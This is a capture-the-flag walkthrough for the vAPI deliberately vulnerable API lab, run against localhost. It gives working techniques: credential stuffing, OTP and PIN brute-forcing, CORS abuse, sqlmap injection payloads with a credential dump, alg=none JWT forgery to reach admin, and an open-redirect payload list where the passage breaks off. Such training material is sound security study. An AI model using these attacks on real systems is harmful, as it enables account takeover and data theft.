# 😇😇 **###### DISCLAIMER ######** _Spoilers below!_ 😇😇
# [vAPI Walkthrough `CTF-ATHOME` Writeup](https://github.com/roottusk/vapi)
[@GangGreenTemperTatum](https://github.com/GangGreenTemperTatum)
<br>
[Postman Collection](https://www.postman.com/roottusk/workspace/vapi/overview)
<br>
**v1.0, 08-21-2023**

![vapi-image](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/e5332171-7e27-429c-aac8-95764aa0e7c9)

## Tips on amending Docker desktop to avoid paying for a license with replacement [Colima](https://github.com/abiosoft/colima) Container Runtime 🐳

- The process should go as following for MAC OS

1) Quit docker desktop
2) Run `docker image ls` → you should get an error like this `Cannot connect to the Docker daemon, ...`
3) Install colima → `brew install colima`
4) Start colima → `colima start --cpu 8 --memory 12` (cpu and memory options only need to be specified on the first run, they persist after that)
5) `docker context use colima`
6) Test the same `docker image ls` command. It shouldn’t error this time around
7) You can now run docker without Docker Desktop! Try building a container or running make dev

Follow up steps

8) Fully uninstall Docker Desktop:
9) Uninstall the docker desktop app from your Mac
10) Install the docker cli `brew install docker`
11) Edit `~/.docker/config.json` and remove the `credsStore` entry
12) `docker context use colima``
13) Install buildx and docker-compose

```
brew install docker-buildx docker-compose
mkdir -p ~/.docker/cli-plugins
ln -sfn /opt/homebrew/opt/docker-compose/bin/docker-compose ~/.docker/cli-plugins/docker-compose
ln -sfn /opt/homebrew/opt/docker-buildx/bin/docker-buildx ~/.docker/cli-plugins/docker-buildx
```

## Setup your local vAPI environment: 🧛

1) `sudo docker run hello-world`
2) Install and run vAPI:

```
mkdir lab
cd lab
git clone https://github.com/roottusk/vapi.git
cd vapi
sudo docker compose up -d

docker-compose ps -a
```

3) Verify vAPI is accessible `% curl http://0.0.0.0:8081 | jq`
4) Create a new Burp Suite project and name `vapi`
5) Ensure all items are shown in the Proxy History, as well as checking "show in scope items only"
6) Add a new Advanced Scope filter for `127.0.0.1`, `localhost`, `^.*\.apisec.*$` and `.*\.api\.*$` using Regex
7) Import `vAPI.postman_collection.json` and `vAPI_ENV.postman_environment.json` in Postman OR Use [Public Workspace](https://www.postman.com/roottusk/workspace/vapi/)
8) Configure Postman local proxy to BurpSuite 127.0.0.1:8080

```
vapi master % docker network ls
NETWORK ID     NAME           DRIVER    SCOPE
f7a1fbc2c913   bridge         bridge    local
c1d256296ff5   host           host      local
b69d0d7fde6a   none           null      local
3cc0bb7813a9   vapi_default   bridge    local
vapi master % docker-compose ps -a
WARN[0000] The "APP_NAME" variable is not set. Defaulting to a blank string.
WARN[0000] The "PUSHER_APP_CLUSTER" variable is not set. Defaulting to a blank string.
WARN[0000] The "PUSHER_APP_KEY" variable is not set. Defaulting to a blank string.
NAME                IMAGE                   COMMAND                  SERVICE             CREATED              STATUS              PORTS
vapi-db-1           mysql:8.0               "docker-entrypoint.s…"   db                  About a minute ago   Up 8 seconds        0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp
vapi-phpmyadmin-1   phpmyadmin/phpmyadmin   "/docker-entrypoint.…"   phpmyadmin          About a minute ago   Up 8 seconds        0.0.0.0:8001->80/tcp, :::8001->80/tcp
vapi-www-1          vapi-www                "docker-php-entrypoi…"   www                 About a minute ago   Up 8 seconds        0.0.0.0:80->80/tcp, :::80->80/tcp
```

### Note, if you come back to your environment at a later stage when Docker is shutdown, execute:

```
vapi master % colima start --cpu 8 --memory 12
INFO[0000] starting colima
INFO[0000] runtime: docker
INFO[0000] preparing network ...                         context=vm
INFO[0000] starting ...                                  context=vm
> Using the existing instance "colima"

vapi master % sudo docker compose up -d
Password:
WARN[0000] The "PUSHER_APP_KEY" variable is not set. Defaulting to a blank string.
WARN[0000] The "APP_NAME" variable is not set. Defaulting to a blank string.
WARN[0000] The "PUSHER_APP_CLUSTER" variable is not set. Defaulting to a blank string.
[+] Running 3/3
 ✔ Container vapi-db-1          Started                                                                                                                                                                                           0.0s
 ✔ Container vapi-www-1         Started                                                                                                                                                                                           0.0s
 ✔ Container vapi-phpmyadmin-1  Started

vapi master % docker ps -a
CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS              PORTS                                                  NAMES
6754f077f17e   phpmyadmin/phpmyadmin   "/docker-entrypoint.…"   19 hours ago   Up About a minute   0.0.0.0:8001->80/tcp, :::8001->80/tcp                  vapi-phpmyadmin-1
84701e313da8   vapi-www                "docker-php-entrypoi…"   19 hours ago   Up About a minute   0.0.0.0:80->80/tcp, :::80->80/tcp                      vapi-www-1
daf672de6d44   mysql:8.0               "docker-entrypoint.s…"   19 hours ago   Up About a minute   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp   vapi-db-1
```

```
vapi master % curlheaders http://127.0.0.1/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1
> User-Agent: curl/8.1.2
> Accept: application/json
> Content-Type: application/json
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Host: 127.0.0.1
Host: 127.0.0.1
< Date: Fri, 18 Aug 2023 04:08:22 GMT
Date: Fri, 18 Aug 2023 04:08:22 GMT
< Connection: close

vapi master % curl http://127.0.0.1/

    <html>
      <head>
        <title>vAPI</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
      </head>
      <body>
        <div id='content'>
    <h1 id="vapi-tweethttpsimgshieldsiotwitterurlhttpshieldsiosvgstylesocialhttpstwittercomintenttweettextcheck20out20vapi20on20githuburlhttpsgithubcomroottuskvapiviavk_tusharhashtagsapisecurityapitop10owasp">vAPI <a href="https://twitter.com/intent/tweet?text=Check%20out%20vAPI%20on%20Github!&url=https://github.com/roottusk/vapi&via=vk_tushar&hashtags=apisecurity,apitop10,owasp"><img src="https://img.shields.io/twitter/url/http/shields.io.svg?style=social" alt="Tweet" /></a></h1>
<p><a href="https://github.com/roottusk/vapi#installation-docker"><img src="https://img.shields.io/badge/docker-support-%2300D1D1" alt="Docker" /></a>
...
```

- The swagger API is located at `http://127.0.0.1/vapi` to access the challenges

## **API1 - BOLA/Broken Object Level Authorization** 🛠️

Send your `POST` request to create a user:

![API1 POST](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/8dc1cb9d-6f2f-4e02-9084-fb24c7526b8c)

I suggest making life easier for yourself by adding the results from the `201` responses throughout the challenge as Postman [environment variables](https://learning.postman.com/docs/sending-requests/variables/) for a smooth experience.

![API1 ID](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/1afe6c43-01c6-4a31-9bc1-2a5e82f06085)

Duplicate the Postman entry and hard-set a random ID# and send it to the Burp Proxy, then send to Burp Intruder, or send straight from Proxy History to Intruder.

Observe the ID can be enumerated without authentication, you can also use Burp Intruder here to enumerate example 1-50 ID numbers:

![API1 Enumerate](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/3ac56f74-04d2-436a-9655-0aa8dd34465a)

```
GET /vapi/api1/user/§1§ HTTP/1.1
Authorization-Token: R2FuZ0dyZWVuVGVtcGVyVGF0dW0xOkhBUElIQUNLRVIxMjMh
Content-Type: application/json
User-Agent: PostmanRuntime/7.32.3
Accept: */*
Cache-Control: no-cache
Postman-Token: 1ad5167a-672a-4807-b767-caf186f61616
Host: 127.0.0.1:80
Accept-Encoding: gzip, deflate
Connection: close
```

Example from ID#1 gives us the flag:

![API1 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/5d3a9aec-4a16-47fb-b65a-d75a191600b6)

## **API2 - Broken Authentication** 🛠️

There's a CSV for a password dump of user accounts/passwords in the following dir:

`vapi master % cat ~/git/lab/vapi/Resources/API2_CredentialStuffing/creds.csv`

Use `awk` to separate the CSV columns into usernames and passwords:

```
vapi master % awk -F "\"*,\"*" '{print $1}' ~/git/lab/vapi/Resources/API2_CredentialStuffing/creds.csv > ~/git/lab/vapi/Resources/API2_CredentialStuffing/usernames.csv
vapi master % awk -F "\"*,\"*" '{print $2}' ~/git/lab/vapi/Resources/API2_CredentialStuffing/creds.csv > ~/git/lab/vapi/Resources/API2_CredentialStuffing/passwords.csv
```

Use Burp to intercept your `POST` request for lab 2 to login and create two separate payloads, adding `usernames` and `passwords` from above, attack type to use is `Cluster Bomb` to enumerate each username and password combination as a single `POST` request.

![API2 Enumerate Intruder](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/e9c7d0f8-cb83-458d-9d2b-9a9318e51f83)
![API2 Payload number 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/a145d903-ed35-44ec-b26d-3bef5d89b31e)

Fire away and filter the output of Burp Intruder Attacker results by Status Code, enable hidden columns too. We are looking for `200` response code, `401` leading to failed authentication.

Alternatively, to speed up this iteration by entering arbitrary data into the fields and adding payloads, then setting Attack Type == **Pitchfork**, both payload sets being the entire `.csv` output. For both payloads, add a `Match and Replace`, `Payload Processing` rule to replace `.*,` for blank which strips out the comma separated columns of usernames and passwords. Uncheck the URL-encode these characters box for both positions, then start the attack which will send 1000 requests.

We can do this, because in this case of vAPI we know the username and password columns in the `.csv` align to the user account, which is a credential stuffing attack we are taking here, not a password spray.

![API2 Intruder Approach 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/6b32feab-28c1-474c-a7c7-a171be4b0305)
![API2 Payload Processing Rule](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/fa06b293-698a-4453-a39d-e38a54b4268a)

Jackpot.

![API2 200 OK](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/0d5a7c77-bc18-4fc0-a968-650212d4d2a6)

Now we have the correct credentials, we can call the next REST API endpoint under API2. We could send this to Burp Repeater, but let's pivot back to Postman:

![API2 Login Token](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/ecd63198-c11d-44f1-a937-d2ac76e5a00d)
![API2 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9437f4d7-f057-44ca-b4cf-da7ccf69d8bf)

## **API3 - Excessive Data Exposure** 🛠️

Reading the `README` in the `./Resources` folder shows: (as well as an APK file)

```
vapi master % cat ~/git/lab/vapi/Resources/API3_APK/README.md
While Adding Base Url in the APK in the start Add it like

baseurl/vapi/

  e.g.:
  If your base url is http://127.0.0.1/

  Add it like http://127.0.0.1/vapi/

```

I initially set my host to my localhost setup of vAPI:

![Android App Host Home]((https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/f09d4f6e-592e-472f-a2df-e5961cd2839e)

Then I identified some strange behavior "`Something went wrong, please try again!`" which I think is related to the virtual emulator and as such could not use my own localhost to simulate this flag.

![Android App Host Home New](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/d682f5cc-3de5-42cf-9307-453196f871e7)
![Android App Create User 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/364745ff-ad4d-4e11-a737-8a8e4315f9b2)

Here I send it to Burp Repeater for analysis:

![Android App Response](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/bd0361d6-caad-4ea8-a215-8a73665cd3b1)

I then continue to inspect and send the follow-up request which shows the API endpoint exposing all PII of the users who commented on the post:

![API3 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/54d5c377-aaa3-46ba-81fb-cf5e3c643ef3)

## **API4 - Lack of Resources & Rate Limiting** 🛠️

The initial API endpoint gives us the hint that the OTP is a 4 digit number, each decimal place being 0 through 9:

![API4 OTP Clue](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/cd1daaee-4ec5-4180-815f-75d080f37267)

We can simply enumerate all potential possible payloads using Burp Intruder by sending Verify OTP REST API endpoint.

![Alt text](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/107508ba-3c0a-4808-86bd-525dc511dc1e)

The payload surrounds the OTP, with the payload being numerical numbers which is effectively brute-forcing 0000-9999 combination attempts:

![Alt text](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/ef96faac-033f-430f-b99c-04043b7867e8)

Since there is no rate limiting in place, leave the intruder to do it's thing and again look for the `200` OK HTTP response among the `403` forbidden's.

![API4 OTP 200](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/e5c62097-bc12-4dc8-8ea3-11ce580a2dfd)

Pause the attack, verify the token provided from the OTP by pivoting to Burp Repeater or send to Postman too:

![API4 Token](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/13c3361f-0727-4d51-8170-1cf1328866a9)

![API4 Token Postman](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/1a2024cf-e6f5-4e53-9df0-baab1c7457e7)

Capture the flag using the authentication key:

![API4 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c0557539-3338-418d-a8c5-05d3d9ebbe17)

## **API5 - Broken Function Level Authorization** 🛠️

The create user `POST` request provides us a `201` indicating a REST API resource has been created, the ID number of the user being 2.
I first tried a few different techniques such as `GET /vapi/api5/user/`, `GET /vapi/api5/admin/` with no luck. Hadn't I found this via my initial techniques, I would pivot to a payload list and try the `GET` requests to unique endpoints.

![API5 Get User 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/5ab62838-076f-4f07-ae66-05b378add089)

![API5 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/4cf9a9d4-7f21-42d0-928d-4a34aa7b7acf)

## **API6 - Mass Assignment** 🛠️

Again, the create user `POST` request provides us a `201` indicating a REST API resource has been created, the ID number of the user being 2 once more.
In our `GET` request `200` OK response we can see a "`credit`" JSON key/value pair, the default being zero.

![API6 POST](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/6a901286-6edb-4107-80d8-00d9bcfa4334)

![API6 GET](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/73512119-a7b6-4072-816b-9419d66089e1)

Therefore, I attempted to create another user whilst adding this structured JSON key/value pair with an arbitrary integer to generate some free loot:

![API6 CREATE CASH](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/a48fe4f7-555d-490b-8051-2bc850f08406)

![API6 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/41fa362e-36a2-4302-8d6a-31c7395089d7)

## **API7 - Security Misconfiguration** 🛠️

Let's first create a user account and check out the flow in Burp looking at the headers:

![API7 CREATE USER](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/388f42bb-b5a3-4fbd-ab96-a34e28dfeb2a)

The CORS policy for the `/vapi/api7/user/key` REST API endpoint is wide-open:

![API7 CORS HEADERS TOKEN](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/1c1973a8-5a35-412d-9a8d-fd749dec1222)

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Thus, a third-party remote site could retriever the user’s ID#, username, password and authentication key.

If we send our request to Burp Repeater and add a custom HTTP request header, captures the flag:

`Origin: <example-site.com>`
`Origin: github.com/GangGreenTemperTatum`

Note: You need the user to be logged in, which is validated from the PHP session cookie value `Cookie: PHPSESSID=XXYY`.

![API7 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/751ac7f9-daa5-4e0d-aec0-9b89ea1a1bf1)

## **API8 - Injection** 🛠️

Nothing too interesting when sending some bogus username and password combination here:

![API8 INTRO](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/8d954958-1a2d-4e1b-9c45-fe7d7dc133cd)

The way I approached this, was to determine if there is any missing or lack of sanitization input from the username and|or password fields in the HTTP `POST` request. To do this, I used numerous [SQL injection payloads](https://github.com/payloadbox/sql-injection-payload-list) including known and common payloads to map and recon the type of underlying database. To do this, I send the API endpoint request to Burp Intruder, using a standard `Sniper` type attack with a bunch of these payloads and filtered for any `5XX` internal server error responses among the standard `403` forbidden's.

Ensure to uncheck "URL-encode these characters" In the Payload encoding section at the bottom of the interface before starting the attack.

![API8 Sniper](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/6001c46d-9cc7-4db5-a2c5-260b8a355a10)

Awesome, a `500` error which indicates MySQL server is failing to sanitize the input. This was as simple as the triggering `POST` request contained a "**`**" in the username field.

![API8 500](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/a590ea55-0e5c-46c8-a8ff-3d9bdc4e14d4)

```
{"errorInfo":["42000",1064,"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'GangGreenTemperTatum' limit 1' at line 1"]}
```

My usual pivot and go-to for SQL injection is the phenomenal [SQLMap](https://github.com/sqlmapproject/sqlmap) project, which I first used to enumerate the underlying databases:

`python3 sqlmap.py -u http://127.0.0.1/vapi/api8/user/login --data="username=u&password=p" -p username --dbs`

![SQLMAP1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/7b7a7058-5f4b-470e-a84f-6fd60249b97a)

![SQLMAP2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/becf7bd3-d71b-4165-8d74-36b0fd9d2bc8)

```
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 977 HTTP(s) requests:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=u' AND GTID_SUBSET(CONCAT(0x716b6a6a71,(SELECT (ELT(9902=9902,1))),0x716a716b71),9902)-- jGXi&password=p

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=u' AND (SELECT 7748 FROM (SELECT(SLEEP(5)))VfZm)-- MRsL&password=p

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: username=u' UNION ALL SELECT NULL,CONCAT(0x716b6a6a71,0x6f44516750507978646f7a435267424765526471635356524f456d615566766f6467706653486259,0x716a716b71)#&password=p
---
[11:04:06] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33
back-end DBMS: MySQL >= 5.6
[11:04:10] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] vapi

[11:04:10] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 682 times, 500 (Internal Server Error) - 284 times
[11:04:10] [INFO] fetched data logged to text files under '/Users/adam/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 11:04:10 /2023-08-20/

```

Deep diving into the obvious DB of interest, being `vapi`. I then enumerate and dig further into it's underlying SQL DB tables which reveals a specific MySQL DB table for API8 (`a_p_i8_users`):

`python3 sqlmap.py -u http://127.0.0.1/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi --tables

![SQLMAP 3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/76ae61c3-ff9f-4ba2-8ef2-1f84ff1157d7)

![SQLMAP 4](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9023b2ec-f3b1-41b0-b82f-80e7f4410f18)

Peeling back the onion, let's checkout the SQL columns within this specific table (expecting something like `username` and `password` columns):

`python3 sqlmap.py -u http://127.0.0.1/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users --columns`

![SQLMAP 5](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/5a7a2d08-0c66-44f9-9333-21b40a829e38)

Let's now try dump the interesting `password`, `secret` and `username` columns:

`python3 sqlmap.py -u http://127.0.0.1/vapi/api8/user/login --data="username=u&password=p" -p username -D vapi -T a_p_i8_users -C password,secret,username --dump`

![SQLMAP 6 API8 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/56cc3210-2a41-4b04-b00d-1661a2cc86b1)

The output contains our admin `username`, `password` and the `secret` being API8 flag.

## **API9 - Improper Assets Management** 🛠️

I initially noticed `v2` REST API has `X-RateLimit` headers compared to `v1`, they both return `200` OK response.

```
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 3
```

However, both responses are empty, meaning that we don't have a true successful response.

![API9 Intruder](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c98e72b2-e7b9-4e13-a09a-363ee3f912b2)

Without putting `v2`'s rate limiting to the test to begin, let's try brute force using Burp Intruder once more to enumerate pin codes from 0000 through 9999. Since a failed response is `200` OK, but the `Length` is ~229 bytes on average due to lack of response body, I sort the results based on the payload length to identify any differences in a legitimate `200` OK but is actually truly successful.

![API9 Intruder Attack](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/800700a2-25f1-4d35-aac3-8317dd3a15dc)

![API9 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/6b21608c-3a6c-4a46-82da-748ccef721dd)

I also created my own local wordlist from [here](https://github.com/LinuxPhreak/crunch-wordlist/blob/master/4-digit-pin-list.txt) under `./vapi/resources/numbers.txt` and used [ffuf](https://github.com/ffuf/ffuf) tool.

I ran these both at the same time, which were both fairly quick as I have Burp Suite Pro, but this may help folks who are only using Community to speed things up a little.

`ffuf -w ./vapi/resources/numbers.txt -X POST -d '{"username":"richardbranson","pin":"FUZZ"}' -H "Content-Type: application/json" -u http://127.0.0.1:80//api9/v1/user/login -fs 0`

![FFUF](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/573202d1-5b24-42fd-bdf5-a01d853faafe)

## **API10 - Security Logging and Monitoring Failures / Logging and Monitoring** 🛠️

Now termed "Security Logging and Monitoring Failures" in the OWASP Top 10 for API's 2023.

🤷 ..

![API10 Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/db218b5b-4809-4251-a90d-36975530af1b)

## **Arena Bonuses** 🐣

Checkout the Postman collection folder called 'Arena' which gives us another three little easter eggs:

![ARENA BONUS FLAGS](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/010f9452-2a32-4766-952e-bb508c8c726e)

## **JustWeakToken**

The initial REST API endpoint in our Postman collection is a `POST` request to "`/jwt/user`:

From the application verifying username and password from the encrypted ciphertext within the `HTTP BODY`, the server generates a "JOT" token which is presumably used as a bearer token for authentication:

![JWT1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c50f0a35-b7f4-4924-8540-2b9fffb4ecca)

I chose to inspect the JWT using the [jwt_tool](https://github.com/ticarpi/jwt_tool). There are a bunch of UI's you can use such as [JWT.io](https://jwt.io/), but this is much more fun.

Inspect the JWT token:

`python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M -T -V`

`python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M`

![JWT2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c03c0497-cc1e-47b4-9b9f-6f3b49ec02fa)
![JWT3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/126e9adc-97ed-4854-b4ba-3f113ca5f9a9)

This JWT is added into subsequent bodies of other requests such as a `GET` to the `/vapi/jwt/user` API endpoint:

![JWT3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/71729175-2a3e-4069-b08b-079849c2628e)

We can remove the token's encoding using the `-X a` flags:

```
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M  -X a
```

![JWT5](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/93ff07c4-a773-4a76-8b92-76e0d730a316)

Taking the first value which is a representation of the JWT token with the authentication signature stripped, again run it through with the `-T` flag and notice the `alg = "none"` (the JWT here has no integrity):

![JWT6](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/283dfe72-ef55-4125-a538-1da1de89b1e7)
![JWT7](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/3367b1b3-e38b-4424-b37a-5bfdb48d3e7d)

By selecting a new role, I can change the value of the role within the JWT token to `admin` from `user` and thus elevate my privileges:

```
Please select a field number:
(or 0 to Continue)
> 3

Current value of role is: user
Please enter new value and hit ENTER
> admin <------- HERE
```

![JWT8](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/30a11acf-e1e5-4040-add0-9b328a13c967)

My new JWT bearer token being `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5Mjc1OTczOSwiZXhwIjoxNjkyNzYxNTM5fQ.`!

I send the `GET` request to Burp Repeater, replace the token under the `Authorization-Token:` header and voila, a flag:

![JWT Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9828e295-9601-4930-a727-d4152ea2b9b8)
![JWT Flag 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/8403262b-bf01-4c1a-ab84-3435d10f9e88)

## **ServerSurfer**

Both collection requests are showing a `GET` request in the `/vapi/serversurfer` REST API endpoint via `/vapi/serversurfer?url=https://<domain>.<tld>` exposing a base64-encoded payload under the `data` field. This is also a potential open-redirect by the looks of things:

![SS1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/7123568c-8f9b-4c01-96b3-3abd23f37529)

I always initially use something like Oralyzer to check for open-redirect exploits:

```
Oralyzer % python3 oralyzer.py -u http://127.0.0.1/vapi/serversurfer?url=

	Oralyzer

[!] Infusing payloads
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=http%253A%252F%252Fwww.google.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=https%253A%252F%252Fwww.google.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fwww.google.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=https%3Awww.google.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=google.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C%2F%5Cgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C%2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=hthttp%3A%2F%2Ftp%3A%2F%2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=x00http%3A%2F%2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%5Cx20http%3A%2F%2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=172.217.167.46
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2F216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F216.58.214.206
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle%E3%80%82com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle%25E3%2580%2582com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=http%5Cx3A%5Cx2F%5Cx2Fgoogle.com
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252E%252E
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252e%252e%252f
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252e%252e%252f
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252e%252e%252f
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252f..
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252f..
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252f..
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252F..
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252F..
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252f%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252f%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252f%252e%252e
[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252f%252e%252e
